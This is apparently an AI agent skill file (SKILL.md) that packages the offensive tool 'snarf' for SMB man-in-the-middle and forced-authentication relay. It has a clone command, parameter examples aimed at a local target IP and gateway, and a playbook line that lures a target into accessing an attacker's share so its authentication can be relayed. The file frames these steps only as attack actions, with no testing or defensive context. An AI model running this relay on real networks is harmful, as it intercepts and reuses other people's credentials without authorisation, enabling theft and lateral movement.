---
name: snarf-mitm-smb
description: "snarf: SMB authentication relay. Signals: MITM, mitm, SMB MITM, gateway, listen."
zh-signals: "snarf: SMB 认证中继。信号:中间人,mitm,SMB 中间人,网关,监听。"
when-to-use: >-
  Use when performing SMB man-in-the-middle or forced-authentication relay on
  a local network segment. Requires a listening interface and optionally a
  target or gateway.
---

# snarf

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/purpleteam/snarf
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/purpleteam/snarf && cd snarf
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `node snarf.js -i eth0 -t 10.0.0.5` | SMB man-in-the-middle |
| `-i eth0 -g` | Gateway |
| `-l` | Listen |

## Attack Scenario Playbook

### SMB authentication relay

```bash
node snarf.js -i eth0 && target accesses \\attacker\share
# Forced authentication relay
```

## Notes

SMB man-in-the-middle plus forced authentication tool.
